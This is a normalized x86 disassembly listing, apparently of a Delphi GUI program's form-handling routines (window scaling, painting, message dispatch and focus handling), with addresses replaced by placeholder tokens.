je r-xdata
add esp 0xfffffff0
call sub_403564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450d63
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_450d24
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41356c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031a8
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
call sub_4039cc
sub_450da4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403454
and [ ebx + 0x2f4 ] 0xdf
sub_450ddc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4503e8
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_4381b0
xor edx edx
mov eax ebx
call sub_4381d4
mov edx 0x140
mov eax ebx
call sub_4381fc
mov edx 0xf0
mov eax ebx
call sub_438220
mov dl 0x1
mov eax [ r-xdata ]
call sub_4214a0
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4516f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb00
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_43761c
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4031a0
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_451a5c
xor edx edx
mov eax ebx
call sub_438c04
xor edx edx
mov eax ebx
call sub_438b6c
mov dl 0x1
mov eax ebx
call sub_43f368
mov edx ebx
mov eax [ rw-data ]
call sub_4560c0
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_450f55
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_4193ec
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_4138f0
xor edx edx
mov eax ebx
call sub_416370
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_454f68
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_450fc0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035cc
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_45108a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4538e4
mov eax [ ebp - 0x4 ]
call sub_43f52c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4560f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403258
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403258
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40cb64
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_450460
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451091
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_4510a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_4510e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_451a5c
sub_4510ea
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403454
test al al
jne r-xdata
call sub_403a48
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_4039f4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_451a5c
sub_451120
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push j_sub_4036e0#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_451180
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43aafc
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403454
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_453428
sub_4511bc
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_437f10
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_413650
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_452820
mov edx esi
mov eax ebp
call sub_4138f0
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4527f8
mov edx esi
mov eax edi
call sub_452820
jmp r-xdata
xor edx edx
mov eax edi
call sub_4527d4
sub_4512c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43bac0
xor edx edx
push ebp
push sub_45151e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43b21c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43845c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4384a0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_451650
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_439bf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451525
mov eax [ ebp - 0x4 ]
call sub_43bac8
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_450928
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43ecec
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_450928
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43ecec
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41c3c4
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_41c3cc
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_45152d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c568
push 0x0
push 0x0
push ebx
push sub_451634
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_451600
push ebx
push sub_451618
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_4515df
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_416a68
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_438b6c
sub_45166b
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_450928
mov ecx edi
mov edx esi
mov eax ebx
call sub_43ecec
mov eax ebx
call sub_451754
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41c468
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_41c484
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_438488
mov ebp eax
push edi
push esi
mov eax ebx
call sub_438444
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_4519fc
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_451a2c
sub_4516f8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_43f228
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_43f52c
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_453a58
push eax
push 0x1
push 0x80
mov eax ebx
call sub_43f228
push eax
call SendMessageA
pop ebx
retn
sub_45178c
push ebx
mov ebx eax
mov eax ebx
call sub_4526a8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_451820
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43f228
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43f2f0
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_43f228
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_43f228
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_4518a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_43f7cc
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_419770
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_419744
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403454
test al al
jne r-xdata
sub_451914
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4031a0
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_451940
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebp
call sub_43bf58
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_419770
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_43f814
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_419744
mov si 0xfff1
call sub_403454
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_419780
jmp r-xdata
sub_4519d4
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_438c28
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_439bf4
sub_4519fc
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43845c
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_451a2c
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4384a0
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_451a5c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_438960
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_452b94
pop esi
pop ebx
retn
sub_451aa0
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_451af9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451b00
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
sub_451b08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_438914
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_43c780
mov eax ebx
call sub_43c91c
sub_451b40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4195bc
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_451b80
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43cc3c
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403454
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403454
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_439bf4
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_439bf4
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_439bf4
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_439bf4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_439bf4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_439bf4
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_44bc9c
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4524ac
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb00
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_451df9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_451ddc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41d4b8
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41d358
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_44d184
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451de3
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41d4b8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_44bc9c
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4524ac
call sub_43f228
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_451f27
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb00
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_451f00
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_451ee3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d4b8
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41d358
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451eea
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41d4b8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_43f228
mov esi eax
sub_451f07
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call ReleaseDC
retn
sub_451fb8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_452004
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4524e0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_45252c
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
